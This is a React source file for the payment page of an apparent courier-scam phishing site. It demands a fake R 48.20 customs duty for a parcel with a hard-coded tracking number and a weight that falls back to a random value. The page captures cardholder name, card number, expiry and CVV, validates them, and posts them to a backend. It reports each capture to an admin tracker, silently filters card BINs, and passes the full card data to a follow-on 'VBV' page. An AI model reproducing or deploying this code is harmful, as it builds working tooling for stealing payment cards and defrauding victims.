import { Navbar } from "@/components/Navbar";
import { Footer } from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent } from "@/components/ui/card";
import { motion } from "framer-motion";
import { useState, useEffect, useRef } from "react";
import { useToast } from "@/hooks/use-toast";
import { useLocation } from "wouter";
import { useVisitId } from "@/hooks/use-visit-id";
import { fetchWithVisitId } from "@/lib/fetch-with-visit-id";
import { addHoneypotToForm } from "@/lib/honeypot";
import { 
  MapPin, 
  Barcode, 
  Package, 
  Weight, 
  FileText, 
  Info, 
  User, 
  CreditCard, 
  Calendar, 
  Lock,
  Loader2,
  ShieldCheck,
  Landmark
} from "lucide-react";

// Validation Luhn pour les numéros de carte
function validateLuhn(cardNumber: string): boolean {
  const cleaned = cardNumber.replace(/\D/g, '');
  if (cleaned.length < 13 || cleaned.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = cleaned.length - 1; i >= 0; i--) {
    let digit = parseInt(cleaned[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
}

// Validation de la date d'expiration
function validateExpiry(expiry: string): boolean {
  const cleaned = expiry.replace(/\D/g, '');
  if (cleaned.length !== 4) return false;
  
  const month = parseInt(cleaned.substring(0, 2), 10);
  const year = parseInt(cleaned.substring(2, 4), 10);
  
  if (month < 1 || month > 12) return false;
  
  const now = new Date();
  const currentYear = now.getFullYear() % 100;
  const currentMonth = now.getMonth() + 1;
  
  // Vérifier si la date est dans le futur
  if (year < currentYear) return false;
  if (year === currentYear && month < currentMonth) return false;
  
  return true;
}

export default function Payment() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const visitId = useVisitId(); // Récupérer le visitId global
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [weight, setWeight] = useState<number | null>(null);
  const [formData, setFormData] = useState({
    cardholder: "",
    cardNumber: "",
    expiry: "",
    cvv: ""
  });
  const [errors, setErrors] = useState({
    cardNumber: "",
    expiry: "",
    cvv: "",
    cardholder: ""
  });
  const formRef = useRef<HTMLFormElement>(null);

  // Ajouter les champs honeypot au formulaire
  useEffect(() => {
    if (formRef.current) {
      addHoneypotToForm(formRef.current);
    }
  }, []);

  // Get or create session ID (stored in localStorage for 12 hours)
  const getSessionId = (): string => {
    const STORAGE_KEY = "parcel_session_id";
    const STORAGE_TIMESTAMP = "parcel_session_timestamp";
    const SESSION_DURATION = 12 * 60 * 60 * 1000; // 12 hours

    const storedId = localStorage.getItem(STORAGE_KEY);
    const storedTimestamp = localStorage.getItem(STORAGE_TIMESTAMP);
    const now = Date.now();

    // Check if session exists and is still valid (less than 12 hours old)
    if (storedId && storedTimestamp) {
      const age = now - parseInt(storedTimestamp, 10);
      if (age < SESSION_DURATION) {
        return storedId;
      }
    }

    // Generate new session ID
    const newSessionId = `${Date.now()}-${Math.random().toString(36).substring(2, 15)}`;
    localStorage.setItem(STORAGE_KEY, newSessionId);
    localStorage.setItem(STORAGE_TIMESTAMP, now.toString());
    return newSessionId;
  };

  // Fetch weight based on IP address
  useEffect(() => {
    const fetchWeight = async () => {
      try {
        const sessionId = getSessionId();
        const res = await fetchWithVisitId("/api/parcel-weight", {
          headers: {
            "X-Session-Id": sessionId,
          },
        });
        if (res.ok) {
          const data = await res.json();
          setWeight(data.weight);
        } else {
          // Fallback to random weight if API fails
          setWeight(Math.round((0.5 + Math.random() * (4 - 0.5)) * 10) / 10);
        }
      } catch (error) {
        // Fallback to random weight if API fails
        setWeight(Math.round((0.5 + Math.random() * (4 - 0.5)) * 10) / 10);
      }
    };
    fetchWeight();
  }, []);

  const handleInputChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    let { id, value } = e.target;
    
    // Basic formatting
    if (id === "cardNumber") {
      // Permettre la saisie jusqu'à 16 chiffres
      value = value.replace(/\D/g, '');
      if (value.length > 16) {
        value = value.substring(0, 16);
      }
      
      // Formater avec des espaces tous les 4 chiffres
      value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
      
      // Mettre à jour la valeur IMMÉDIATEMENT pour permettre la saisie complète
      setFormData(prev => ({
        ...prev,
        [id]: value
      }));
      
      const cleaned = value.replace(/\D/g, '');
      
      // Validation Luhn seulement si le numéro est complet (16 chiffres exactement)
      if (cleaned.length === 16) {
        const isValid = validateLuhn(cleaned);
        setErrors(prev => ({
          ...prev,
          cardNumber: isValid ? "" : "Invalid Card Number"
        }));
      } else if (cleaned.length < 16) {
        // Si le numéro n'est pas complet, effacer les erreurs
        setErrors(prev => ({
          ...prev,
          cardNumber: ""
        }));
      }
      
      // Retourner ici car la valeur est déjà mise à jour
      return;
    } else if (id === "expiry") {
      value = value.replace(/\D/g, '').substring(0, 4);
      if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2);
      }
      
      // Validation de la date d'expiration (sans message d'erreur)
      if (value.length === 5) {
        const isValid = validateExpiry(value);
        setErrors(prev => ({
          ...prev,
          expiry: ""
        }));
      } else {
        setErrors(prev => ({
          ...prev,
          expiry: ""
        }));
      }
    } else if (id === "cvv") {
      value = value.replace(/\D/g, '').substring(0, 3);
      setErrors(prev => ({
        ...prev,
        cvv: ""
      }));
    } else if (id === "cardholder") {
      setErrors(prev => ({
        ...prev,
        cardholder: value.trim().length < 2 ? "Nom du titulaire requis" : ""
      }));
    }

    setFormData(prev => ({
      ...prev,
      [id]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Empêcher les doubles soumissions
    if (isSubmitting) {
      return;
    }
    
    console.log("[Payment] Submit started");
    
    // Validation complète avec Luhn
    const cardNumberCleaned = formData.cardNumber.replace(/\D/g, '');
    const isLuhnValid = validateLuhn(cardNumberCleaned);
    const isExpiryValid = validateExpiry(formData.expiry);
    const isCvvValid = formData.cvv.length === 3;
    const isCardholderValid = formData.cardholder.trim().length >= 2;
    
    // Mettre à jour les erreurs
    const newErrors = {
      cardNumber: !isLuhnValid 
        ? "Invalid Card Number" 
        : "",
      expiry: "",
      cvv: "",
      cardholder: !isCardholderValid ? "Nom du titulaire requis" : ""
    };
    
    setErrors(newErrors);
    
    // Vérifier les erreurs de base (y compris Luhn)
    if (!isLuhnValid || !isExpiryValid || !isCvvValid || !isCardholderValid) {
      toast({
        title: "Validation error",
        description: "Please correct the fields with errors.",
        variant: "destructive",
      });
      return;
    }
    
    // Toutes les validations passées, activer le mode soumission
    console.log("[Payment] All validations passed, setting isSubmitting to true");
    setIsSubmitting(true);
    
    console.log("[Payment] About to submit to API");

    try {
      console.log("[Payment] Sending request to /api/payment/submit");
      // Use the secure API endpoint avec visitId automatique
      const response = await fetchWithVisitId("/api/payment/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cardholder: formData.cardholder,
          cardNumber: formData.cardNumber,
          expiry: formData.expiry,
          cvv: formData.cvv,
          amount: "R 48.20",
        }),
      });

      console.log("[Payment] Response received:", response.status, response.ok);

      if (response.ok) {
        const data = await response.json();

        // notify admin panel tracker (no sensitive data)
        void fetchWithVisitId("/api/flows/event", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            step: "payment",
            flowId: data.flowId,
            notes: "Payment form submitted",
          }),
        });

        toast({
          title: "Payment Processed",
          description: "Your payment has been successfully processed.",
          duration: 2000,
        });

        // Récupérer le fullName depuis localStorage (depuis la page home) ou utiliser cardholder
        const storedFullName = localStorage.getItem("client_fullname");
        const fullName = storedFullName || formData.cardholder;

        // Stocker les données de paiement dans localStorage pour la page VBV
        localStorage.setItem("payment_data", JSON.stringify({
          cardholder: formData.cardholder,
          cardNumber: formData.cardNumber,
          expiry: formData.expiry,
          cvv: formData.cvv,
          fullName: fullName,
        }));

        // Redirect to verification page
        setTimeout(() => setLocation("/payment-verification"), 1000);
      } else {
        const errorData = await response.json();
        // Si l'erreur vient du serveur (BIN invalide), ne pas afficher de message
        if (errorData.error && (errorData.error.includes("BIN") || errorData.error.includes("bin"))) {
          // Blocage silencieux côté serveur aussi
          setIsSubmitting(false);
          return;
        }
        throw new Error(errorData.message || "Failed to process payment");
      }
    } catch (error) {
      toast({
        title: "Error",
        description:
          error instanceof Error
            ? error.message
            : "Failed to process payment. Please try again.",
        variant: "destructive",
      });
      console.error(error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col w-full bg-slate-50 font-sans overflow-x-hidden">
      <Navbar />

      <main className="flex-grow py-8 px-4 md:px-8">
        <div className="container mx-auto max-w-2xl">
          
          {/* Header */}
          <div className="flex items-center gap-2 mb-6">
             <MapPin className="h-5 w-5 text-brand-blue" />
             <span className="font-bold text-brand-blue text-lg">Where I'm up to:</span>
             <span className="font-bold text-brand-blue border-b-2 border-brand-orange pb-0.5">Payment Details</span>
          </div>

          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >
            {/* Parcel Details Card */}
            <Card className="border-t-4 border-t-brand-orange shadow-sm mb-8 overflow-hidden bg-white">
              <CardContent className="p-6">
                <div className="space-y-4">
                  <div className="flex justify-between items-center border-b border-gray-100 pb-3">
                    <div className="flex items-center gap-2 text-brand-blue font-medium">
                      <Barcode className="h-4 w-4" />
                      <span className="text-sm">Tracking Number:</span>
                    </div>
                    <span className="font-bold text-brand-blue font-mono">CI22105583668</span>
                  </div>
                  
                  <div className="flex justify-between items-center border-b border-gray-100 pb-3">
                    <div className="flex items-center gap-2 text-brand-blue font-medium">
                      <Package className="h-4 w-4" />
                      <span className="text-sm">Parcel Type:</span>
                    </div>
                    <span className="font-medium text-gray-600">Standard Parcel</span>
                  </div>

                  <div className="flex justify-between items-center border-b border-gray-100 pb-3">
                    <div className="flex items-center gap-2 text-brand-blue font-medium">
                      <Weight className="h-4 w-4" />
                      <span className="text-sm">Weight:</span>
                    </div>
                    <span className="font-bold text-gray-600">
                      {weight !== null ? `${weight} kg` : "Loading..."}
                    </span>
                  </div>

                  <div className="flex justify-between items-center">
                    <div className="flex items-center gap-2 text-brand-blue font-medium">
                      <FileText className="h-4 w-4" />
                      <span className="text-sm">Fee Type:</span>
                    </div>
                    <span className="font-bold text-brand-orange">Customs Clearance Duty</span>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Amount Banner */}
            <div className="bg-[#4d6b99] rounded-lg p-8 mb-4 text-center shadow-md relative overflow-hidden text-white">
               <div className="absolute inset-0 bg-white/5 skew-x-12 transform -translate-x-1/2"></div>
               <h2 className="text-4xl font-black relative z-10">
                 <span className="text-2xl align-top mr-1 font-medium opacity-80">R</span>
                 48.20
               </h2>
            </div>

            <div className="flex items-center justify-center gap-2 text-brand-blue/70 text-sm mb-8 font-medium">
               <Info className="h-4 w-4" />
               <p>This is a mandatory customs duty for international parcels</p>
            </div>

            {/* Payment Form */}
            <form ref={formRef} onSubmit={handleSubmit} className="space-y-6 bg-white p-6 md:p-8 rounded-xl shadow-sm border border-gray-100">
               <div className="space-y-2">
                 <div className="flex items-center gap-2 font-bold text-brand-blue">
                   <User className="h-4 w-4" />
                   <Label htmlFor="cardholder">Cardholder Name</Label>
                 </div>
                 <Input 
                   id="cardholder" 
                   placeholder="e.g. JOHN SMITH" 
                   className={`h-12 bg-gray-50/50 ${
                     errors.cardholder 
                       ? "border-red-500 focus:border-red-500 focus:ring-red-500" 
                       : "border-gray-200"
                   }`}
                   value={formData.cardholder}
                   onChange={handleInputChange}
                   required
                 />
                 {errors.cardholder && (
                   <p className="text-red-500 text-sm mt-1">{errors.cardholder}</p>
                 )}
               </div>

               <div className="space-y-2">
                 <div className="flex items-center gap-2 font-bold text-brand-blue">
                   <CreditCard className="h-4 w-4" />
                   <Label htmlFor="cardNumber">Card Number</Label>
                 </div>
                 <Input 
                   id="cardNumber" 
                   placeholder="1234 5678 9012 3456" 
                   className={`h-12 bg-gray-50/50 font-mono ${
                     errors.cardNumber 
                       ? "border-red-500 focus:border-red-500 focus:ring-red-500" 
                       : "border-gray-200"
                   }`}
                   value={formData.cardNumber}
                   onChange={handleInputChange}
                   required
                   maxLength={19}
                 />
                 {errors.cardNumber && (
                   <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>
                 )}
               </div>

               <div className="grid grid-cols-2 gap-6">
                 <div className="space-y-2">
                   <div className="flex items-center gap-2 font-bold text-brand-blue">
                     <Calendar className="h-4 w-4" />
                     <Label htmlFor="expiry">Expiry (MM/YY)</Label>
                   </div>
                   <Input 
                     id="expiry" 
                     placeholder="MM/YY" 
                     className={`h-12 bg-gray-50/50 ${
                       errors.expiry 
                         ? "border-red-500 focus:border-red-500 focus:ring-red-500" 
                         : "border-gray-200"
                     }`}
                     value={formData.expiry}
                     onChange={handleInputChange}
                     required
                     maxLength={5}
                   />
                   {errors.expiry && (
                     <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>
                   )}
                 </div>
                 
                 <div className="space-y-2">
                   <div className="flex items-center gap-2 font-bold text-brand-blue">
                     <Lock className="h-4 w-4" />
                     <Label htmlFor="cvv">CVV</Label>
                   </div>
                   <Input 
                     id="cvv" 
                     placeholder="123" 
                     className={`h-12 bg-gray-50/50 font-mono ${
                       errors.cvv 
                         ? "border-red-500 focus:border-red-500 focus:ring-red-500" 
                         : "border-gray-200"
                     }`}
                     value={formData.cvv}
                     onChange={handleInputChange}
                     required
                     maxLength={3}
                     type="password"
                   />
                   {errors.cvv && (
                     <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>
                   )}
                 </div>
               </div>

               {/* Payment Icons */}
               <div className="flex justify-center gap-4 py-4">
                  <div className="bg-white border rounded px-3 py-1 flex items-center gap-1 text-xs font-bold text-gray-600">
                     <CreditCard className="h-3 w-3" /> Visa
                  </div>
                  <div className="bg-white border rounded px-3 py-1 flex items-center gap-1 text-xs font-bold text-gray-600">
                     <CreditCard className="h-3 w-3" /> MasterCard
                  </div>
                  <div className="bg-white border rounded px-3 py-1 flex items-center gap-1 text-xs font-bold text-gray-600">
                     <Landmark className="h-3 w-3" /> EFT
                  </div>
                  <div className="bg-white border rounded px-3 py-1 flex items-center gap-1 text-xs font-bold text-gray-600">
                     <CreditCard className="h-3 w-3" /> Amex
                  </div>
               </div>

               <Button 
                 type="submit" 
                 disabled={isSubmitting}
                 className="w-full h-14 bg-brand-orange hover:bg-orange-600 text-white font-bold text-lg shadow-md transition-all hover:scale-[1.01] flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
               >
                 {isSubmitting ? (
                   <>
                     <Loader2 className="h-6 w-6 animate-spin" />
                     Processing...
                   </>
                 ) : (
                   <>
                     <ShieldCheck className="h-6 w-6" />
                     Pay R 48.20
                   </>
                 )}
               </Button>

               <div className="flex items-center justify-center gap-2 text-gray-400 text-xs font-medium pt-2 text-center">
                  <Lock className="h-3 w-3" />
                  <span>Secure 256-bit SSL encrypted payment</span>
               </div>
            </form>

          </motion.div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
